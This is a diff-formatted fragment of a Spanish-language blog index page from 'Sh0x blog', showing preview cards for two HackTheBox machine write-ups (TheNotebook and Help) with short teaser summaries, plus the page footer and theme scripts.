+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/thenotebook">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/help">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/help/170banner.png" alt="HackTheBox - Help"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/help">HackTheBox - Help</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel fácil. Investigaremos subidas de archivos .php en el servicio HelpDeskZ, jueguitos sucios con MySQL y una explotación de un kernel con ganas de morir.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">22 Jul 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
